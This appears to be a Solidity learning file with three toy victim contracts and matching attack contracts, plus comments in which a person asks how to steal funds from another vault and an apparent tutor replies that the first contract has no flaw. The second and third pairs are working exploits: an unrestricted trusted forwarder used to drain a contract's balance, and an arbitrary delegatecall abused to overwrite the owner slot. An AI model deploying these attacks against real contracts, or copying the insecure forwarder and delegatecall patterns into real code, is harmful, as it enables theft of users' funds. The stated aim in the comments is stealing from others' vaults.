// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Vault {

    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function withdraw() external {
        require(msg.sender == owner, "NOT OWNER");

        (bool ok,) =
            payable(msg.sender).call{
                value: address(this).balance
            }("");

        require(ok, "FAILED");
    }
}

contract Helper {

Vault public vault;

function attack() external {
    (bool ok ,) = vault.call(abi.encodeWithSignature("withdraw()"));
    require(ok , "FAILED");
}

}

//listen i understand i mistake i did  and i learn from but now to steal another vault fund according to me i need that vault address to call that withdraw and if i will also get that am not the owner so the check stop me everytime so how can we do that 

// EXACTLY.
// And this is the MOST IMPORTANT realization.
// You just discovered something huge:
// “Wait… there is actually no vulnerability.”
// YES.
// That’s the lesson.

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Target {

    address public trustedForwarder;

    constructor(address _forwarder) payable {
        trustedForwarder = _forwarder;
    }

    function execute(address to) external {
        require(
            msg.sender == trustedForwarder,
            "NOT FORWARDER"
        );

        (bool ok,) =
            payable(to).call{
                value: address(this).balance
            }("");

        require(ok);
    }
}

contract Forwarder {

    function forward(
        address target,
        bytes calldata data
    ) external {

        (bool ok,) = target.call(data);
        require(ok);
    }
}

contract Attack {

    Forwarder public forwarder;
    Target public target;

    function steal ( ) external {
        bytes memory data = abi.encodeWithSignature("execute(address)", address(this));
        forwarder.forward(address(target),data);
    }

}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Lib {

    uint256 public number;

    function setNumber(uint256 x) external {
        number = x;
    }
}

contract Victim {

    address public owner;
    uint256 public number;

    constructor() {
        owner = msg.sender;
    }

    function execute(
        address lib,
        bytes calldata data
    ) external {

        (bool ok,) = lib.delegatecall(data);
        require(ok);
    }
}

contract Attack {
    Victim public victim ;
    Lib public lib;
    function becomeVictimOwner() external {
        bytes memory data = abi.encodeWithSignature("setNumber(uint256)",uint256(uint160(msg.sender)));
        victim.execute(address(lib),data);
    }
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////